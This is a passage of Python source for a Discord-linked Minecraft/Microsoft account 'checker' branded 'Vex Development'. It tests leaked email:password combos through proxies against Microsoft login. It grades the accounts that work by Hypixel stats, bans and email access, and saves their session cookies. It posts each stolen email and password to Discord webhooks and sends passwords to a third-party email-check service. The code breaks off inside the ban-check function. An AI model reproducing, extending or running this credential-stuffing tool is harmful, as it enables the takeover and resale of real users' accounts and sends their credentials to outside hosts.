import discord
from discord.ext import commands
import asyncio
import threading
import queue
import time
from datetime import datetime
import os
from dotenv import load_dotenv
import requests, re, readchar, os, time, threading, random, urllib3, configparser, json, concurrent.futures, traceback, warnings, uuid, socket, socks, sys
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from io import StringIO
from http.cookiejar import MozillaCookieJar

# Linux-specific imports
try:
    from colorama import Fore
    colorama_available = True
except ImportError:
    colorama_available = False
    # Create basic color class for Linux
    class Fore:
        YELLOW = '\033[93m'
        GREEN = '\033[92m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        LIGHTMAGENTA_EX = '\033[95m'
        LIGHTBLUE_EX = '\033[94m'
        LIGHTGREEN_EX = '\033[92m'
        LIGHTRED_EX = '\033[91m'

# Linux console utils replacement
class LinuxUtils:
    @staticmethod
    def set_title(title):
        # For Linux terminals
        sys.stdout.write(f"\033]0;{title}\007")
        sys.stdout.flush()

# Use Linux utils instead of console.utils
utils = LinuxUtils()

# Linux file dialog replacement
class LinuxFileDialog:
    @staticmethod
    def askopenfile(**kwargs):
        filepath = input("Enter the full path to your file: ")
        if os.path.exists(filepath):
            return type('FileObj', (), {'name': filepath})()
        return None

filedialog = LinuxFileDialog()

# Minecraft imports (you'll need to install these dependencies)
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Warning: Minecraft networking library not available. Ban checking will be disabled.")

logo = Fore.YELLOW+'''
\n'''
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
Combos = []
proxylist = []
banproxies = []
fname = ""
hits,bad,twofa,cpm,cpm1,errors,retries,checked,vm,sfa,mfa,maxretries,xgp,xgpu,other = 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
unbanned, banned_count = 0, 0
session_webhook_url = None
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type, session):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.session = session
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl != None: message+=f"\nHypixel: {self.hypixl}"
        if self.level != None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin != None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin != None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape != None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access != None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins != None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars != None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged != None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged != None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def notify(self):
        global errors, session_webhook_url
        try:
            webhook_url = config.get('webhook') or session_webhook_url
            
            if str(self.banned).lower() == "false" and config.get('UnbannedWebhook'):
                webhook_url = config.get('UnbannedWebhook')
            elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown" and config.get('BannedWebhook'):
                webhook_url = config.get('BannedWebhook')

            if not webhook_url:
                return

            if config.get('embed') == True:
                embed_color = 0
                if str(self.banned).lower() == "false":
                    embed_color = 0
                elif str(self.banned).lower() != "false" and str(self.banned).lower() != "unknown":
                    embed_color = 0
                
                payload = {
                "username": "Vex Development",
                "avatar_url": f"https://mc-heads.net/avatar/{self.name}",
                "embeds": [
                    {
                    "author": {"name": "Vex Development", "url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"},
                    "title": self.name,
                    "color": 37166,
                    "fields": [
                                {"name": "<a:mail:1415294347162681355> Email", "value": f"||{self.email}||", "inline": True},
                                {"name": "<a:password:1415294427752038511> Password", "value": f"||{self.password}||", "inline": True},
                                {"name": "<a:banned:1415293976445194243> Banned", "value": f"{self.banned or 'Unknown'}", "inline": True},
                                {"name": "<a:hypixel:1415293267804815391> Hypixel Name", "value": self.hypixl or "N/A", "inline": True},
                                {"name": "<a:name:1415295283948027924> Can Change Name", "value": self.namechanged or "N/A", "inline": True},
                                {"name": "<a:ms_coin:1415293380690186240> Hypixel Level", "value": self.level or "N/A", "inline": True},
                                {"name": "<a:cape:1415293674647982121> Capes", "value": f"{self.capes or 'None'} | Optifine: {self.cape or 'No'}", "inline": True},
                                {"name": "<a:mcfa:1415293802402414634> Account Type", "value": self.type or "N/A", "inline": True},
                                {"name": "<a:MicrosoftMojang:1415294909006745691> Combo", "value": f"||{self.email}:{self.password}||", "inline": True},
                                {"name": "<:emoji_1:1450698111172214805> First Login", "value": self.firstlogin or "N/A", "inline": True},
                                {"name": "<2:emoji_2:1450698140784132226> Last Login", "value": self.lastlogin or "N/A", "inline": True},
                                {"name": "<:emoji_3:1450698187277864960> Last Name Change", "value": self.lastchanged or "N/A", "inline": True},
                                {"name": "<a:emoji_4:1450698212112465971> Skyblock Coins", "value": self.sbcoins or "N/A", "inline": True},
                                {"name": "<a:emoji_7:1450698237060321301> Bedwars Stars", "value": self.bwstars or "N/A", "inline": True},
                                {"name": "<:emoji_6:1450698265011032127> Email Access", "value": self.access or "N/A", "inline": True},
                            ],
                            "thumbnail": {"url": f"https://mc-heads.net/avatar/{self.name}"},
                            "footer": {
                                "text": "Vex Development | made with ❤️ by Vortex",
                                "icon_url": "https://i.ibb.co/yGmtWXV/file-00000000d0707209b72dd557897448e2.png"

                            }
                        }
                    ]
                }
            else:
                payload = {
                    "content": config.get('message')
                        .replace("<email>", self.email)
                        .replace("<password>", self.password)
                        .replace("<name>", self.name or "N/A")
                        .replace("<hypixel>", self.hypixl or "N/A")
                        .replace("<level>", self.level or "N/A")
                        .replace("<firstlogin>", self.firstlogin or "N/A")
                        .replace("<lastlogin>", self.lastlogin or "N/A")
                        .replace("<ofcape>", self.cape or "N/A")
                        .replace("<capes>", self.capes or "N/A")
                        .replace("<access>", self.access or "N/A")
                        .replace("<skyblockcoins>", self.sbcoins or "N/A")
                        .replace("<bedwarsstars>", self.bwstars or "N/A")
                        .replace("<banned>", self.banned or "Unknown")
                        .replace("<namechange>", self.namechanged or "N/A")
                        .replace("<lastchanged>", self.lastchanged or "N/A")
                        .replace("<type>", self.type or "N/A"),
                    "username": "Vex Development"
                }

            requests.post(webhook_url, data=json.dumps(payload), headers={"Content-Type": "application/json"})
        except:
            pass

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=getproxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=getproxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=getproxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    open(f"results/{fname}/MFA.txt", 'a').write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    open(f"results/{fname}/SFA.txt", 'a').write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < maxretries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', headers={'Authorization': f'Bearer {self.token}'}, proxies=getproxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxylist) < 5: time.sleep(20)
                        Capture.namechange(self)
                except: pass
                tries+=1
                retries+=1

    def save_cookies(self, type):
        cfname = os.path.join(f'results/{fname}', 'Cookies')
        if not os.path.exists(cfname):
            os.makedirs(cfname)
        bfname = os.path.join(cfname, type)
        if not os.path.exists(bfname):
            os.makedirs(bfname)
        cookie_file_path = os.path.join(bfname, f'{self.name}.txt')
        jar = MozillaCookieJar(cookie_file_path)
        for cookie in self.session.cookies:
            jar.set_cookie(cookie)
        jar.save(ignore_discard=True)
        with open(cookie_file_path, 'r') as file:
            lines = file.readlines()
        lines = lines[3:]
        while lines and lines[0].strip() == '':
            lines.pop(0)
        with open(cookie_file_path, 'w') as file:
            file.writelines(lines)

    def ban(self, session):
        global errors, unbanned, banned_count
        if config.get('hypixelban'):
            if not minecraft_available:
                self.banned = "Unknown (Library not available)"
                return
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            original_socket = socket.socket
            max_ban_retries = maxretries if maxretries > 0 else 3
            while tries < max_ban_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47, allowed_versions={"1.8", 47})
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    global unbanned, banned_count
                    try:
                        data = json.loads(str(packet.json_data))
                        if "Suspicious activity" in str(data):
                            self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "temporarily banned" in str(data):
                            self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "You are permanently banned from this server!" in str(data):
                            self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
                            banned_count += 1
                        elif "The Hypixel Alpha server is currently closed!" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "Failed cloning your SkyBlock data" in str(data):
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        elif "kicked" in str(data).lower() or "disconnect" in str(data).lower():
                            self.banned = "False"
                            with open(f"results/{fname}/Unbanned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Unbanned')
                            unbanned += 1
                        else:
                            try:
                                self.banned = ''.join(item["text"] for item in data.get("extra", []))
                            except:
                                self.banned = str(data)
                            with open(f"results/{fname}/Banned.txt", 'a') as f: f.write(f"{self.email}:{self.password}\n")
                            self.save_cookies('Banned')
